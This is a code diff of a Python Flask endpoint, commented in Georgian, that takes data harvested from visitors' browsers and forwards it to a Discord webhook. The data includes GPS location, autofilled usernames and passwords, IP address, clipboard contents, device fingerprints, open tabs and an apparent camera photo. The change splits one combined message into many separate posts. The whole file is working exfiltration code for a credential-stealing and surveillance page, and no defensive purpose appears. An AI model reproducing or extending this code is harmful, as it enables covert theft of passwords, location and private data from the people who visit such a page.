@@ -20,7 +20,7 @@ def upload_data():
         data = request.json
         secret = data.get('secret', {})
         
-        # 🚨 1. პირველი შეტყობინება: ლოკაცია
+        # 🚨 1. ლოკაცია
         if secret.get('lat') and secret['lat'] != "უარი":
             maps_link = f"https://www.google.com/maps?q={secret['lat']},{secret['lon']}"
             location_msg = f"📍 **ლოკაცია:** [დააჭირე რუკის საჩვენებლად]({maps_link})"
@@ -29,14 +29,27 @@ def upload_data():
         
         requests.post(DISCORD_WEBHOOK_URL, json={"content": location_msg})
 
-        # 🚨 2. მეორე შეტყობინება: ტელეფონის ინფო და საიდუმლოებები
-        info_msg = f"💻 **მოწყობილობა:**\n• **ბრაუზერი:** `{secret.get('userAgent', 'უცნობია')}`\n• **ეკრანი:** `{secret.get('screen', 'უცნობია')}`\n• **RAM:** `{secret.get('ram', 'უცნობია')}`\n"
-        info_msg += f"\n🔑 **ავტოშევსება:**\n• **იუზერი:** `{secret.get('autofilledUser', 'ვერ წაიკითხა')}`\n• **პაროლი:** `{secret.get('autofilledPass', 'ვერ წაიკითხა')}`\n"
-        info_msg += f"\n🕵️‍♂️ **საიდუმლო:**\n• **IP:** `{secret.get('ip', 'უცნობია')}`\n• **ხმის ანაბეჭდი:** `{secret.get('audioFingerprint', 'უცნობია')}`\n• **ფონტები:** `{secret.get('fonts', 'უცნობია')}`\n• **კლიპბორდი:** `{secret.get('clipboard', 'უცნობია')}`\n• **ბატარეა:** `{secret.get('battery', 'უცნობია')}`\n• **ინტერნეტი:** `{secret.get('network', 'უცნობია')}`\n• **ტაბები:** `{secret.get('tabs', 'უცნობია')}`\n• **ორიენტაცია:** `{secret.get('orientation', 'უცნობია')}`\n• **ვიბრაცია:** `{secret.get('vibrated', 'არა')}`"
-        
-        requests.post(DISCORD_WEBHOOK_URL, json={"content": info_msg})
+        # 🚨 2. ტელეფონის ინფო (ცალ-ცალკე)
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"💻 **ბრაუზერი:** `{secret.get('userAgent', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🖥️ **ეკრანი:** `{secret.get('screen', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🧠 **RAM:** `{secret.get('ram', 'უცნობია')}`"})
 
-        # 🚨 3. მესამე შეტყობინება: ფოტო
+        # 🚨 3. ავტოშევსება
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔑 **ავტოშევსების იუზერი:** `{secret.get('autofilledUser', 'ვერ წაიკითხა')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔑 **ავტოშევსების პაროლი:** `{secret.get('autofilledPass', 'ვერ წაიკითხა')}`"})
+
+        # 🚨 4. საიდუმლო ინფო (ცალ-ცალკე)
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🌐 **IP მისამართი:** `{secret.get('ip', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🎵 **ხმის ანაბეჭდი:** `{secret.get('audioFingerprint', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔤 **ფონტები:** `{secret.get('fonts', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"📋 **კლიპბორდი:** `{secret.get('clipboard', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔋 **ბატარეა:** `{secret.get('battery', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🌐 **ინტერნეტი:** `{secret.get('network', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🗂️ **ტაბები:** `{secret.get('tabs', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"📱 **ორიენტაცია:** `{secret.get('orientation', 'უცნობია')}`"})
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"📳 **ვიბრაცია:** `{secret.get('vibrated', 'არა')}`"})
+
+        # 🚨 5. ფოტო
         if secret.get('image'):
             image_data = secret['image'].replace("data:image/png;base64,", "")
             image_bytes = base64.b64decode(image_data)
